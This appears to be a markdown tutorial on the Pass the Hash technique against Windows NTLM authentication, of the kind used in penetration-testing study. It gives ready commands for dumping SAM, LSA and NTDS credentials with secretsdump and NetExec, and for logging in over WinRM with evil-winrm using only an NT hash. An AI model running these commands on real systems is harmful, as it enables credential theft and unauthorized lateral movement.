# 🔐 Pass the Hash (PtH) 

### What is Pass the Hash?

**Pass the Hash (PtH)** is a technique where an attacker uses the **NT hash** of a user's password to authenticate to services without needing the plaintext password. This works because NTLM (Windows authentication protocol) accepts the hash itself for login.

> An attacker doesn't need to crack the password — just knowing the hash is enough to impersonate the user!

##  Theory Behind PtH

- NTLM authentication relies on a challenge-response mechanism using the NT hash.
- If an attacker gets the hash, they can "pass" it to remote systems and authenticate as that user.
- It's commonly used in post-exploitation stages to move laterally or dump more credentials.


## Practice

The Impacket script secretsdump has the ability to remotely dump hashes and LSA secrets from a machine (LMhash can be empty).

```
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
```
```
secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
```
```
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
```

NetExec (Python) has the ability to do it on a set of targets. The bh_owned has the ability to set targets as "owned" in BloodHound (see dumping credentials from registry hives).

```
netexec smb $TARGETS -u $USER -H $NThash --sam --local-auth
```
```
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --lsa
```
```
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --ntds
```


### Example of WinRM and Pass-the-Hash?

**WinRM (Windows Remote Management)** is a Microsoft protocol that allows remote command execution using PowerShell. It’s commonly used in system administration.

When **Pass-the-Hash (PtH)** is combined with WinRM, it allows an attacker to authenticate with just an **NTLM hash**, without knowing the actual password — **as long as the target is configured to allow local admin access via WinRM.**

---

###  Why It Works

When you run `Enable-PSRemoting` on a Windows system:
- It **enables WinRM**
- It **sets `LocalAccountTokenFilterPolicy = 1`**, which:
  - Lets **local admin accounts** log in remotely
  - Removes the usual token filtering for non-domain users
  - **Allows PtH with local admin accounts**

---

###  Example: Using `evil-winrm` to Pass the Hash

Suppose you have the following:

- **Target IP:** `192.168.129.140`  
- **Username:** `jack` (local admin)  
- **NTLM hash:** `f26db8968d8e6c0790978baaaaaaaaaa`

You can use the `evil-winrm` tool like this:

```bash
evil-winrm -i 192.168.129.140 -u jack -H f26db8968d8e6c0790978baaaaaaaaaa
```

 **Note:** No password needed — just the NT hash!

---

### Point:

**Pass-the-Hash (PtH)** depends on the **NTLM hash** — specifically the **NT hash**, *not* the LM hash.

---

###  Hash Types in Windows Authentication

| Type     | Used in PtH? | Description                            |
|----------|--------------|----------------------------------------|
| **NT Hash** | ✅ Yes       | Modern hash of the password (MD4 of Unicode) |
| **LM Hash** | ❌ No        | Legacy hash, weak and often disabled   |

---

###  Why NT Hash?

- When using PtH, tools like `evil-winrm`, `psexec.py`, `wmiexec.py`, etc. send the **NT hash** in the NTLM authentication process — **mimicking** the real password.
- Windows systems accept the hash if the user has the correct privileges.

---
